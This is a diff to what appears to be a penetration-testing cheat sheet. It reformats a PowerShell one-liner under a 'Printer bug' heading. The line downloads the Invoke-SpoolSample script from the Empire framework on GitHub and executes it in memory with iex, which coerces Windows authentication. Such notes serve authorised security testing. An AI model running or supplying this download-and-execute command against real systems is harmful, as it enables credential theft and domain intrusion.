@@ -688,7 +688,9 @@ klist
 # Printer bug - why wait when you can spool?
 https://github.com/leechristensen/SpoolSample
 
-```iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1")```
+```
+iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1")
+```
 
 * * * 
 
